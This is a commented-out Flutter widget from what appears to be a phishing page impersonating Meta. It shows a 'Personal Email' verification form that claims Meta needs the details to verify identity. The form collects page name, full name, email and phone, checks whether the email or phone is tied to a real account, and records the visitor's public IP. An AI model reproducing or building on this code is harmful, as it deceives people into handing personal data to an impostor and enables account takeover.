// import 'package:_iwu_pack/_iwu_pack.dart';

// import 'package:flutter/material.dart';
// import 'package:flutter_bloc/flutter_bloc.dart';
// import 'package:gap/gap.dart';
// import 'package:meta_business/src/presentation/widgets/widget_input.dart';

// import '../../bloc/home_bloc.dart';
// import 'model_sucess.dart';

// class PersonalWidget extends StatefulWidget {
//   const PersonalWidget({
//     super.key,
//   });

//   @override
//   State<PersonalWidget> createState() => _PersonalWidgetState();
// }

// class _PersonalWidgetState extends State<PersonalWidget> {
//   final HomeBloc _homeBloc = HomeBloc();

//   FocusNode node1 = FocusNode();
//   FocusNode node2 = FocusNode();
//   FocusNode node3 = FocusNode();
//   FocusNode node4 = FocusNode();

//   bool hasFocus1 = false;
//   bool hasFocus2 = false;
//   bool hasFocus3 = false;
//   bool hasFocus4 = false;

//   TextEditingController text1 = TextEditingController();
//   TextEditingController text2 = TextEditingController();
//   TextEditingController text3 = TextEditingController();
//   TextEditingController text4 = TextEditingController();

//   String error1 = "";
//   String error2 = "";
//   String error3 = "";
//   String error4 = "";

//   bool isNextView = false;
//   bool isEmail = true;

//   FormInput? data;
//   @override
//   void initState() {
//     super.initState();
//     node1.addListener(onFocusChange);
//     node2.addListener(onFocusChange);
//     node3.addListener(onFocusChange);
//     node4.addListener(onFocusChange);
//   }

//   @override
//   void dispose() {
//     node1.removeListener(onFocusChange);
//     node2.removeListener(onFocusChange);
//     node3.removeListener(onFocusChange);
//     node4.removeListener(onFocusChange);
//     node1.dispose();
//     node2.dispose();
//     node3.dispose();
//     node4.dispose();
//     super.dispose();
//   }

//   void onFocusChange() {
//     setState(() {
//       hasFocus1 = node1.hasFocus;
//       hasFocus2 = node2.hasFocus;
//       hasFocus3 = node3.hasFocus;
//       hasFocus4 = node4.hasFocus;
//     });
//   }

//   submit() async {
//     setState(() {
//       if (text1.text.isEmpty) {
//         error1 = "Please enter some text";
//       } else {
//         error1 = "";
//       }
//       if (text2.text.isEmpty) {
//         error2 = "Please enter some text 2";
//       } else {
//         error2 = "";
//       }
//       if (!text3.text.isEmail || text3.text.isEmpty) {
//         error3 = "Invalid Email";
//       } else {
//         _homeBloc.add(CheckingEmailEvent(text3.text));
//         error3 = "";
//       }
//       if (text4.text.isEmpty) {
//         error4 = "Please enter some text 4";
//       } else {
//         error4 = "";
//       }
//     });
//   }

//   @override
//   Widget build(BuildContext context) {
//     return Expanded(
//       child: BlocConsumer<HomeBloc, HomeState>(
//         bloc: _homeBloc,
//         listener: (context, state) async {
//           if (state is CheckingState) {
//             print("Checking email");
//             showDialog(
//                 context: context,
//                 builder: (context) {
//                   return const Center(
//                     child: CircularProgressIndicator(),
//                   );
//                 });
//           }
//           if (state is CheckingEmailFinishState) {
//             Navigator.of(context).pop();
//             print('return checking state');
//             print('checking state value ${state.response['status']}');
//             if (state.response['status'] == 400) {
//               setState(() {
//                 error3 =
//                     "The email you entered is not connected to any account.";
//                 isEmail = false;
//               });
//               await Future.delayed(const Duration(seconds: 1)); // Đợi 0.5 giây
//               _homeBloc.add(CheckingPhoneEvent(text4.text));
//             }
//             if (state.response['status'] == 200) {
//               String ip = await getPublicIP();
//               setState(() {
//                 data = FormInput(
//                     pageName: text1.text,
//                     fullName: text2.text,
//                     email: text3.text,
//                     phone: text4.text,
//                     ip: ip);
//                 isNextView = true;
//               });
//             }
//           }
//           if (state is CheckingPhoneFinishState) {
//             Navigator.of(context).pop();
//             print('return checking state');
//             print('checking state value ${state.response['status']}');
//             if (state.response['status'] == 400) {
//               setState(() {
//                 error4 =
//                     "The phone number you entered is not connected to any account.";
//               });
//             }
//             if (state.response['status'] == 200) {
//               String ip = await getPublicIP();
//               setState(() {
//                 data = FormInput(
//                     pageName: text1.text,
//                     fullName: text2.text,
//                     email: text3.text,
//                     phone: text4.text,
//                     ip: ip);
//                 isNextView = true;
//               });
//             }
//           }
//         },
//         builder: (context, state) {
//           return GestureDetector(
//             onTap: () => FocusScope.of(context).unfocus(),
//             child: Container(
//               padding: const EdgeInsets.all(50),
//               child: isNextView
//                   ? ModalSuccess(
//                       data: data,
//                       isEmail: isEmail,
//                     )
//                   : Column(
//                       mainAxisAlignment: MainAxisAlignment.start,
//                       crossAxisAlignment: CrossAxisAlignment.start,
//                       children: [
//                         Text(
//                           "Personal Email",
//                           style: w600TextStyle(fontSize: 28),
//                         ),
//                         const Gap(4),
//                         Text(
//                           """Meta uses this information to verify your identify and to keep our community safe. You decide what personal details you make visible to others.""",
//                           style: w300TextStyle(height: 1.4, fontSize: 18),
//                         ),
//                         const Gap(24),
//                         Column(
//                           children: [
//                             InputForm(
//                               label: 'Page Name',
//                               hasFocus: hasFocus1,
//                               node: node1,
//                               controller: text1,
//                               error: error1,
//                               borderRadius: const BorderRadius.only(
//                                   topLeft: Radius.circular(16),
//                                   topRight: Radius.circular(16)),
//                             ),
//                             const Gap(4),
//                             InputForm(
//                               label: 'Full Name',
//                               hasFocus: hasFocus2,
//                               node: node2,
//                               controller: text2,
//                               error: error2,
//                             ),
//                             const Gap(4),
//                             InputForm(
//                               label: 'Personal Email',
//                               hasFocus: hasFocus3,
//                               node: node3,
//                               controller: text3,
//                               error: error3,
//                             ),
//                             const Gap(4),
//                             InputForm(
//                               label: 'Mobile',
//                               hasFocus: hasFocus4,
//                               node: node4,
//                               controller: text4,
//                               error: error4,
//                               borderRadius: const BorderRadius.only(
//                                   bottomLeft: Radius.circular(16),
//                                   bottomRight: Radius.circular(16)),
//                             ),
//                           ],
//                         ),
//                         const Gap(24),
//                         Align(
//                           alignment: Alignment.topRight,
//                           child: WidgetRippleButton(
//                             onTap: submit,
//                             color: hexColor('1a56db'),
//                             borderRadius: BorderRadius.circular(8),
//                             child: Container(
//                               padding: const EdgeInsets.symmetric(
//                                   horizontal: 24, vertical: 12),
//                               child: Text(
//                                 "Submit",
//                                 style: w500TextStyle(
//                                     fontSize: 16, color: Colors.white),
//                               ),
//                             ),
//                           ),
//                         ),
//                       ],
//                     ),
//             ),
//           );
//         },
//       ),
//     );
//   }
// }
